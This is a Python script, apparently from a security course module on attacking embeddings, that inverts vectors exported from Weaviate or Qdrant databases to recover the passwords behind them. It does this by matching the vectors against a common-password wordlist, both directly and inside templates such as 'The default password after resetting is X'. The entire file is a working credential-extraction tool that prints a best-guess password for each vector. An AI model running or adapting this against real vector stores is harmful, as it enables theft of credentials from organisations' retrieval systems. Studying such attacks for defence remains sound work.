#!/usr/bin/env python3
"""
Script: inversion_attack.py
Module: 06 — Attacking Embeddings
Purpose: Invert embedding vectors to recover probable source text using direct + template encoding.
Usage: python3 inversion_attack.py --vectors /tmp/prp_vectors.json --wordlist /tmp/10k-most-common.txt
Target: Exported Weaviate/Qdrant vectors in JSON format (from weaviate_export.py or manual export)
"""
import os, json, argparse
import numpy as np

# Use offline mode if model is cached locally
os.environ["TRANSFORMERS_OFFLINE"] = "1"
os.environ["HF_DATASETS_OFFLINE"] = "1"

TEMPLATES = [
    "The default password after resetting is {p}",
    "Your temporary password is {p} which must be changed immediately",
    "The default password for new hires is {p} please reset on first login",
    "Login credentials: username admin, password {p}",
    "password: {p}",
]

def find_model_path():
    """Find locally cached sentence-transformer model."""
    import subprocess
    result = subprocess.run(
        ["find", "/", "-type", "d", "-name", "*MiniLM*"],
        capture_output=True, text=True, timeout=10
    )
    paths = [p for p in result.stdout.strip().split('\n') if 'snapshots' in p]
    return paths[0] if paths else "sentence-transformers/all-MiniLM-L6-v2"

def main():
    p = argparse.ArgumentParser()
    p.add_argument("--vectors", default="/tmp/prp_vectors.json")
    p.add_argument("--wordlist", default="/tmp/10k-most-common.txt")
    p.add_argument("--model", default=None, help="Model path or HuggingFace ID")
    p.add_argument("--top", type=int, default=5, help="Top N candidates to show")
    args = p.parse_args()

    # Load vectors
    data = json.load(open(args.vectors))
    stored = [(d["properties"], np.array(d["vector"])) for d in data if d.get("vector")]
    print(f"[+] Loaded {len(stored)} vectors  dim={len(stored[0][1])}")

    # Load wordlist
    passwords = [l.strip() for l in open(args.wordlist) if l.strip()]
    print(f"[+] Loaded {len(passwords)} candidates from {args.wordlist}")

    # Load model
    model_path = args.model or find_model_path()
    print(f"[*] Loading model: {model_path}")
    from sentence_transformers import SentenceTransformer
    model = SentenceTransformer(model_path)
    print("[+] Model loaded")

    # Encode strategies
    print("[*] Encoding candidates (direct)...")
    pw_emb = model.encode(passwords, batch_size=256, normalize_embeddings=True,
                          show_progress_bar=True)

    print("[*] Encoding candidates (template: 'default password after resetting is X')...")
    templates = [f"The default password after resetting is {p}" for p in passwords]
    tpl_emb = model.encode(templates, batch_size=256, normalize_embeddings=True,
                           show_progress_bar=True)

    print("\n" + "=" * 60)
    print("EMBEDDING INVERSION RESULTS")
    print("=" * 60)

    for i, (props, vec) in enumerate(stored):
        vec_n = vec / np.linalg.norm(vec)
        sims_direct = pw_emb @ vec_n
        sims_tpl    = tpl_emb @ vec_n
        top_direct = np.argsort(sims_direct)[-args.top:][::-1]
        top_tpl    = np.argsort(sims_tpl)[-args.top:][::-1]

        print(f"\n[Vector {i+1}]  {props}")
        print(f"  Strategy 1 — direct password encoding:")
        for idx in top_direct:
            print(f"    [{sims_direct[idx]:.4f}] {passwords[idx]}")
        print(f"  Strategy 2 — template 'default password after resetting is X':")
        for idx in top_tpl:
            print(f"    [{sims_tpl[idx]:.4f}] {passwords[idx]}")
        print(f"  → BEST GUESS: {passwords[top_tpl[0]]}  (sim={sims_tpl[top_tpl[0]]:.4f})")

if __name__ == "__main__":
    main()
